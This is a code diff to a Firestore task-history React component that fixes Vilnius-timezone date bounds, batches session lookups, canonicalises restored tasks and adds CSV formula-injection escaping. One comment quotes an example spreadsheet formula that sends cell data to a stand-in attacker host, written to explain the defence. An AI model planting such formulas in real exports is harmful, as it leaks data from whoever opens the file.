@@ -4,13 +4,13 @@ import { collection, query, orderBy, onSnapshot, deleteDoc, doc, setDoc, where, 
 import { FileText, Download, RotateCcw, Calendar, UserCheck, Clock, AlertCircle, ChevronDown, ChevronUp } from 'lucide-react';
 import { useAuth } from '../context/AuthContext';
 import { confirmTask, humanActor, MODES } from '../domain';
-import { getPriorityLabel } from '../utils/priority';
+import { getPriorityLabel, normalizePriority } from '../utils/priority';
 import clsx from 'clsx';
 import { startOfWeek, subWeeks } from 'date-fns';
 import { formatDisplayName, isManagerRole, resolveUserId, resolveUserName } from '../utils/formatters';
 import { privateScopeConstraints, isScopedOverseer } from '../utils/teamScope';
 import { TASK_TAGS } from '../utils/taskUtils';
-import { getLithuanianDateString, getLithuanianNow, calculateCurrentTotalMinutes, formatMinutesToTimeString, formatMinutesToHHMM } from '../utils/timeUtils';
+import { getLithuanianDateString, getLithuanianNow, calculateCurrentTotalMinutes, formatMinutesToTimeString, formatMinutesToHHMM, vilniusWallClockToISO, addDaysToDateString } from '../utils/timeUtils';
 import { deleteTask } from '../utils/taskActions';
 import { downloadTextFile } from '../utils/download';
 import { DeleteConfirmationModal, CommentsModal, TimeAdjustmentsModal } from './TaskDetailsModals';
@@ -35,6 +35,70 @@ const FILTER_LABEL_CLASS = 'text-caption uppercase font-bold text-ink-muted';
 const SELECT_CLASS =
     'bg-surface-card border border-line text-ink text-body rounded-input block w-full px-2.5 py-1.5 ' +
     'focus:border-brand focus:outline-none focus-visible:ring-2 focus-visible:ring-brand';
+
+// Firestore caps an `in` filter at 30 values, so the AI export groups its session lookups into
+// chunks of that size instead of issuing one query per exported task.
+const SESSION_TASK_CHUNK = 30;
+
+// Payload for un-archiving a task back onto the active board. The archived row must NOT be written
+// back verbatim: writing to /tasks is a CREATE, and the live create rule validates the shape
+// (`taskFieldsOk` in firestore.rules) OUTSIDE the role branches — so it applies to admins too.
+// Production archived rows carry legacy priorities ("Urgent", the retired "VERY_LOW") and can carry
+// a string-typed estimate; both are rejected, and "Grąžinti" then failed with permission-denied on
+// every such row with no way forward for the manager. Canonicalize the two guarded fields here.
+// Exported so the DailyStatistics restore path builds the identical payload and cannot drift.
+// eslint-disable-next-line react-refresh/only-export-components -- pure helper exported for unit tests.
+export const buildRestoredTaskPayload = (task) => {
+    const payload = {
+        ...task,
+        priority: normalizePriority(task.priority),
+        status: 'in-progress',
+        timerStatus: 'paused',
+        completed: false,
+        completedAt: null,
+        confirmedAt: null,
+        confirmedBy: null,
+        archivedAt: null,
+        archivedBy: null,
+        isDeleted: false,
+        deletedAt: null,
+        deletedBy: null,
+        updatedAt: new Date().toISOString()
+    };
+    // The rule accepts estimatedTimeMinutes only as a number in [0, 60000] — or absent. A legacy
+    // string ("90") or an out-of-range value would fail the whole create, so drop what we cannot
+    // certify rather than guess at a duration: an absent estimate is recoverable by editing the
+    // restored task, a wrong one silently misstates planned time.
+    if ('estimatedTimeMinutes' in payload) {
+        const minutes = Number(payload.estimatedTimeMinutes);
+        if (Number.isFinite(minutes) && minutes >= 0 && minutes <= 60000) {
+            payload.estimatedTimeMinutes = minutes;
+        } else {
+            delete payload.estimatedTimeMinutes;
+        }
+    }
+    return payload;
+};
+
+// One CSV cell. Two jobs:
+//  1. quote anything containing a separator, quote or newline, and
+//  2. neutralise SPREADSHEET FORMULAS. Excel and LibreOffice evaluate any cell whose first
+//     character is `= + - @` (or a leading tab/CR), so a worker-authored task title such as
+//     `=HYPERLINK("https://attacker.example/?d="&A2,"Atidaryti")` would execute the moment the
+//     manager — the account with the widest Firestore access — opens the exported timesheet.
+//     Prefixing a single quote and forcing the value into quotes makes the cell literal text.
+// eslint-disable-next-line react-refresh/only-export-components -- pure helper exported for unit tests.
+export const escapeCSV = (str) => {
+    if (str === null || str === undefined) return '""';
+    const s = String(str);
+    if (/^[=+\-@\t\r]/.test(s)) {
+        return `"'${s.replace(/"/g, '""')}"`;
+    }
+    if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
+        return `"${s.replace(/"/g, '""')}"`;
+    }
+    return s;
+};
 
 // `canExport` gates the CSV / AI-JSON download buttons. It is OFF by default so personal
 // report views (a worker's own "Ataskaitos", and a manager's personal "Ataskaitos") never
@@ -125,14 +189,17 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
 
         setLoading(true);
 
-        const start = new Date(dateFrom);
-        start.setHours(0, 0, 0, 0); // Start of day
-
-        const end = new Date(dateTo);
-        end.setHours(23, 59, 59, 999); // End of day
-
-        const startIso = start.toISOString();
-        const endIso = end.toISOString();
+        // dateFrom/dateTo are VILNIUS calendar days (getLithuanianDateString feeds them, and the
+        // picker's max is the Vilnius today). `new Date('YYYY-MM-DD')` parses as UTC midnight and
+        // setHours then rewrote the fields in the DEVICE's zone, so on any off-Vilnius clock both
+        // ends slid by the zone offset and most of the last selected day fell out of the list — and
+        // out of the CSV built from it — with nothing on screen to say anything was dropped.
+        // Anchor both ends to Vilnius wall-clock and compare half-open [start, next-day-start),
+        // the same shape Reports.jsx uses. The || fallbacks are defensive: the helper only returns
+        // null for a malformed date string, which these cannot be.
+        const startIso = vilniusWallClockToISO(dateFrom, '00:00') || dateFrom;
+        const endExclusiveDay = addDaysToDateString(dateTo, 1);
+        const endIso = vilniusWallClockToISO(endExclusiveDay, '00:00') || endExclusiveDay;
 
         // Determine effective user ID to query
         // If explicit 'userId' prop is passed (e.g. from Worker view), use it.
@@ -153,7 +220,7 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
         });
         const constraints = [
             where('archivedAt', '>=', startIso),
-            where('archivedAt', '<=', endIso),
+            where('archivedAt', '<', endIso),
             orderBy('archivedAt', 'desc'),
             ...scope
         ];
@@ -187,7 +254,7 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
                 // The vadovas supplement carries no archivedAt range (single-field equality, no
                 // composite index), so bound it to the selected window here; base rows are already
                 // server-bounded and pass trivially.
-                if (task.archivedAt && (task.archivedAt < startIso || task.archivedAt > endIso)) return false;
+                if (task.archivedAt && (task.archivedAt < startIso || task.archivedAt >= endIso)) return false;
                 if (targetUserId !== 'all' && task.assignedUserId !== targetUserId) return false;
                 if (filterTag !== 'all' && task.tag !== filterTag) return false;
                 // Approval surface: restrict the archive to this manager's tasks — ones they own
@@ -305,25 +372,40 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
 
     const handleExport = async () => {
         try {
-            const exportDataPromises = displayedTasks.map(async (task) => {
+            // Sessions for the WHOLE export, fetched once and grouped by task. The previous shape
+            // issued one `where('taskId','==',…)` query per displayed task and released them all
+            // concurrently: a wide archive window is several thousand simultaneous round trips from
+            // one phone, which hangs the button for minutes and, on a cellular link, times out into
+            // "Nepavyko paruošti…" with no partial result. Chunked `in` queries run one after the
+            // other and return the SAME rows (every session of every exported task, whatever its
+            // date), at a thirtieth of the round trips.
+            const taskIds = displayedTasks.map((t) => t.id).filter(Boolean);
+            const sessionsByTaskId = new Map();
+            for (let i = 0; i < taskIds.length; i += SESSION_TASK_CHUNK) {
+                const chunk = taskIds.slice(i, i + SESSION_TASK_CHUNK);
+                const sessionsSnap = await getDocs(
+                    query(collection(db, 'work_sessions'), where('taskId', 'in', chunk))
+                );
+                sessionsSnap.docs.forEach((docSnap) => {
+                    const data = docSnap.data();
+                    if (!sessionsByTaskId.has(data.taskId)) sessionsByTaskId.set(data.taskId, []);
+                    sessionsByTaskId.get(data.taskId).push(data);
+                });
+            }
+
+            const exportData = displayedTasks.map((task) => {
                 const realTimeMinutes = calculateCurrentTotalMinutes(task);
-                
-                // Fetch work sessions to get session times
-                const sessionsQuery = query(collection(db, 'work_sessions'), where('taskId', '==', task.id));
-                const sessionsSnap = await getDocs(sessionsQuery);
-                const sessionTimes = sessionsSnap.docs
+
+                const sessionTimes = (sessionsByTaskId.get(task.id) || [])
                     // Manual adjustments are reported separately under `timeAdjustments`;
                     // excluding them here stops the same correction appearing twice in the
                     // export (once as a session, once as an adjustment).
-                    .filter(doc => !doc.data().isManualAdjustment)
-                    .map(doc => {
-                        const data = doc.data();
-                        return {
-                            date: data.date,
-                            durationMinutes: data.durationMinutes ? Math.round(data.durationMinutes) : 0,
-                            formattedDuration: data.durationMinutes ? formatMinutesToTimeString(data.durationMinutes) : '0h 0m'
-                        };
-                    }).filter(s => s.durationMinutes > 0);
+                    .filter(data => !data.isManualAdjustment)
+                    .map(data => ({
+                        date: data.date,
+                        durationMinutes: data.durationMinutes ? Math.round(data.durationMinutes) : 0,
+                        formattedDuration: data.durationMinutes ? formatMinutesToTimeString(data.durationMinutes) : '0h 0m'
+                    })).filter(s => s.durationMinutes > 0);
 
                 const cleanedAdjustments = (task.timeAdjustments || []).map(adj => ({
                     date: adj.date,
@@ -359,8 +441,6 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
                 };
             });
 
-            const exportData = await Promise.all(exportDataPromises);
-
             const dataStr = JSON.stringify(exportData, null, 2);
             downloadTextFile(dataStr, `ai_task_analysis_${dateFrom}_to_${dateTo}.json`, 'application/json');
         } catch (err) {
@@ -370,15 +450,6 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
     };
 
     const handleExportCSV = () => {
-        const escapeCSV = (str) => {
-            if (str === null || str === undefined) return '""';
-            const s = String(str);
-            if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
-                return `"${s.replace(/"/g, '""')}"`;
-            }
-            return s;
-        };
-
         const headers = [
             "Pavadinimas",
             "Aprašymas",
@@ -444,21 +515,9 @@ export default function TaskHistory({ userId, users = [], canExport = false, app
         if (!task) return;
         setRestoring(true);
         try {
-            const restoredTask = {
-                ...task,
-                status: 'in-progress',
-                timerStatus: 'paused',
-                completed: false,
-                completedAt: null,
-                confirmedAt: null,
-                confirmedBy: null,
-                archivedAt: null,
-                archivedBy: null,
-                isDeleted: false,
-                deletedAt: null,
-                deletedBy: null,
-                updatedAt: new Date().toISOString()
-            };
+            // Canonicalized, not spread verbatim — see buildRestoredTaskPayload for why a legacy
+            // archived row is rejected by the /tasks create rule.
+            const restoredTask = buildRestoredTaskPayload(task);
 
             await setDoc(doc(db, 'tasks', task.id), restoredTask);
             await deleteDoc(doc(db, 'archived_tasks', task.id));
